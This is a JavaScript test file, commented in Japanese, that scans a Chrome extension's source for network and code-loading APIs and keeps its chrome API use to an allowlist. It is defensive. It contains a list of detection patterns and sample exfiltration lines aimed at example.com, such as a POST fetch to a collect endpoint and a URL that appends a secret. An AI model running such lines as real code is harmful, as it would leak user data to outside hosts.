// ネットワークを使わないことの試験（ソースコードの静的な検査）
//
// 拡張機能として読み込まれるファイル（tests/ 以外）を文字列として読み、
//   1. ネットワーク通信や、ページを開く・コードを読み込む機能の名前が、どこにも書かれていないこと
//   2. 使っている chrome API が、決めた一覧（受け口への送信は sendNativeMessage だけ）にあること
//   3. import の読み込み先が、拡張機能の中のファイルだけであること
// を確かめます。コメントの中も検査するため、コメントにもこれらの名前を書かないでください。
//
// これは「書かれていない」ことの確認です。ブラウザー側でも、manifest.json の
// content_security_policy（connect-src 'none'）で、拡張機能のページからの通信を断らせています。
import assert from "node:assert/strict";
import { existsSync, readdirSync, readFileSync } from "node:fs";
import { dirname, join, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

const extensionDir = fileURLToPath(new URL("..", import.meta.url));

// 拡張機能のファイル（tests/ は Chrome が使わないため除きます）
function listSourceFiles(dir) {
  const files = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) {
      if (path === join(extensionDir, "tests") || entry.name === "node_modules") {
        continue;
      }
      files.push(...listSourceFiles(path));
    } else if (/\.(js|mjs|cjs|html|json)$/.test(entry.name)) {
      files.push(path);
    }
  }
  return files;
}

const sourceFiles = listSourceFiles(extensionDir);
const scriptFiles = sourceFiles.filter((path) => /\.(js|mjs|cjs)$/.test(path));

// 書いてはいけない名前と、その理由
const FORBIDDEN = [
  [/\bfetch\b/, "HTTP の通信"],
  [/\bXMLHttpRequest\b/, "HTTP の通信"],
  [/\bWebSocket\b/, "WebSocket の通信"],
  [/\bEventSource\b/, "サーバーからの送信の受け取り"],
  [/\bsendBeacon\b/, "ビーコンの送信"],
  [/\bWebTransport\b/, "WebTransport の通信"],
  [/\bRTC(?:PeerConnection|DataChannel)\b/, "WebRTC の通信"],
  [/\bimportScripts\b/, "スクリプトの読み込み"],
  [/\bimport\s*\(/, "動的な import（外のスクリプトを読み込める）"],
  [/\bnew\s+(?:Shared)?Worker\b/, "別のワーカーの起動"],
  [/\beval\s*\(|\bFunction\s*\(/, "文字列をコードとして実行"],
  [/\bnew\s+Image\b|\bImage\s*\(/, "画像の読み込みを使った送信"],
  [/\.\s*open\s*\(|\blocation\s*\.\s*(?:href|assign|replace)\b/, "ページを開く・移動する"],
  [/\b(?:sendMessage|onMessageExternal|onConnectExternal)\b/, "ほかの拡張機能・ページとのやり取り"],
  [/\bsetUninstallURL\b/, "アンインストール時に Web ページを開く"],
  [/\b(?:globalThis|self|window|chrome)\s*\[/, "名前を組み立てて使う（検査をすり抜けられる）"],
];

// 使ってよい chrome API（これ以外を使うと試験が失敗します）
const ALLOWED_CHROME_APIS = [
  "downloads.onCreated.addListener",
  "downloads.onChanged.addListener",
  "downloads.onErased.addListener",
  "downloads.search",
  "tabs.query",
  "storage.session.get",
  "storage.session.set",
  "storage.session.remove",
  "runtime.sendNativeMessage", // この PC の受け口へ送る、ただ1つの経路
  "runtime.lastError",
  "action.onClicked.addListener",
  "action.setBadgeText",
  "action.setBadgeBackgroundColor",
  "action.setTitle",
];

function lineNumberAt(text, index) {
  return text.slice(0, index).split("\n").length;
}

test("検査するファイルがある（background.js と lib/ の中）", () => {
  const names = scriptFiles.map((path) => relative(extensionDir, path).split("\\").join("/")).sort();
  assert.ok(names.includes("background.js"), names.join(", "));
  assert.ok(names.includes("lib/message.js"), names.join(", "));
  assert.ok(names.includes("lib/sanitise.js"), names.join(", "));
});

test("ネットワーク通信などの機能の名前が、拡張機能のファイルに書かれていない", () => {
  const found = [];
  for (const path of sourceFiles) {
    const text = readFileSync(path, "utf8");
    for (const [pattern, reason] of FORBIDDEN) {
      const globalPattern = new RegExp(pattern.source, "g");
      for (const match of text.matchAll(globalPattern)) {
        found.push(`${relative(extensionDir, path)}:${lineNumberAt(text, match.index)}「${match[0]}」（${reason}）`);
      }
    }
  }
  assert.deepEqual(found, []);
});

test("使っている chrome API が、決めた一覧の中だけ（外へ出す経路は sendNativeMessage だけ）", () => {
  const used = new Set();
  const notAllowed = [];
  for (const path of scriptFiles) {
    const text = readFileSync(path, "utf8");
    for (const match of text.matchAll(/\bchrome\.([A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)*)/g)) {
      used.add(match[1]);
      if (!ALLOWED_CHROME_APIS.includes(match[1])) {
        notAllowed.push(`${relative(extensionDir, path)}:${lineNumberAt(text, match.index)} chrome.${match[1]}`);
      }
    }
  }
  assert.deepEqual(notAllowed, []);
  assert.ok(used.has("runtime.sendNativeMessage"), "受け口への送信が見つからない");
});

test("import の読み込み先は、拡張機能の中のファイルだけ", () => {
  const problems = [];
  let count = 0;
  for (const path of scriptFiles) {
    const text = readFileSync(path, "utf8");
    const specifiers = [
      ...text.matchAll(/\bfrom\s*["']([^"']+)["']/g),
      ...text.matchAll(/\bimport\s*["']([^"']+)["']/g),
    ];
    for (const match of specifiers) {
      count += 1;
      const specifier = match[1];
      const target = resolve(dirname(path), specifier);
      const insideExtension = !relative(extensionDir, target).startsWith("..");
      if (!/^\.\.?\//.test(specifier) || !specifier.endsWith(".js") || !insideExtension || !existsSync(target)) {
        problems.push(`${relative(extensionDir, path)}:${lineNumberAt(text, match.index)} ${specifier}`);
      }
    }
  }
  assert.deepEqual(problems, []);
  assert.ok(count >= 2, "import が見つからない（検査の正規表現を確かめてください）");
});

test("検査の正規表現が、実際に通信の書き方を見つけられる（検査そのものの確認）", () => {
  const samples = [
    'await fetch("https://example.com/collect", { method: "POST" });',
    "const request = new XMLHttpRequest();",
    'navigator.sendBeacon("https://example.com/b", data);',
    'const socket = new WebSocket("wss://example.com/");',
    'const module = await import("https://example.com/remote.js");',
    'self["fe" + "tch"]("https://example.com/");',
    'chrome.tabs.create({ url: "https://example.com/?q=" + secret });',
  ];
  for (const sample of samples) {
    const hitByName = FORBIDDEN.some(([pattern]) => pattern.test(sample));
    const chromeCalls = [...sample.matchAll(/\bchrome\.([A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)*)/g)].map((match) => match[1]);
    const hitByChromeList = chromeCalls.some((name) => !ALLOWED_CHROME_APIS.includes(name));
    assert.ok(hitByName || hitByChromeList, sample);
  }
});
